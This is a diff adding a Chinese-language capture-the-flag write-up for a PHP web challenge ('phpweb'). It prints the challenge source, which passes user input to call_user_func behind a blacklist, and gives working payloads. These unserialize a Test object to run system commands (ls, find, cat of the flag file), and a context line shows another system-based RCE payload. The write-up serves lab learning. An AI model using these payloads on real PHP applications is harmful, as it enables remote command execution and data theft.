@@ -1329,3 +1329,100 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag
 
 
 
+# [网鼎杯 2020 朱雀组]phpweb
+
+![image-20201210190510038](Buuoj-WEB-Write-up/image-20201210190510038.png)
+
+打开一会发现网页自动刷新了，抓包看看
+
+![image-20201210190602388](Buuoj-WEB-Write-up/image-20201210190602388.png)
+
+自动刷新
+
+```
+setTimeout("document.form1.submit()",5000)
+```
+
+怀疑调用函数，尝试传参
+
+```
+func=file_get_contents&p=index.php
+```
+
+得到源码
+
+```php
+<?php
+$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+function gettime($func, $p) {
+    $result = call_user_func($func, $p);
+    $a= gettype($result);
+    if ($a == "string") {
+        return $result;
+    } else {return "";}
+}
+class Test {
+    var $p = "Y-m-d h:i:s a";
+    var $func = "date";
+    function __destruct() {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+$func = $_REQUEST["func"];
+$p = $_REQUEST["p"];
+
+if ($func != null) {
+    $func = strtolower($func);
+    if (!in_array($func,$disable_fun)) {
+        echo gettime($func, $p);
+    }else {
+        die("Hacker...");
+    }
+}
+?>
+```
+
+分析发现禁用了不少函数，调用了`call_user_func()`函数，可能存在命令执行。
+
+`gettype()`函数限制执行后返回必须为String类型。
+
+观察发现，本题只对传入参数进行一次waf，代码中还给了个类Test，类中调用`gettime()`函数不会被waf，于是可用序列化方法，将代码序列化传入，再反序列化执行命令。
+
+尝试传参
+
+```
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}
+```
+
+![image-20201210191635044](Buuoj-WEB-Write-up/image-20201210191635044.png)
+
+再扫根目录文件
+
+```
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}
+```
+
+![image-20201210192034277](Buuoj-WEB-Write-up/image-20201210192034277.png)
+
+根目录没发现flag，利用system来找一下，`find / -name fla*`
+
+![image-20201210192305790](Buuoj-WEB-Write-up/image-20201210192305790.png)
+
+发现了奇怪的东西，打开即为flag
+
+![image-20201210192428939](Buuoj-WEB-Write-up/image-20201210192428939.png)
+
+payload：
+
+```
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
+```
+
+
+
+---
+
+
+
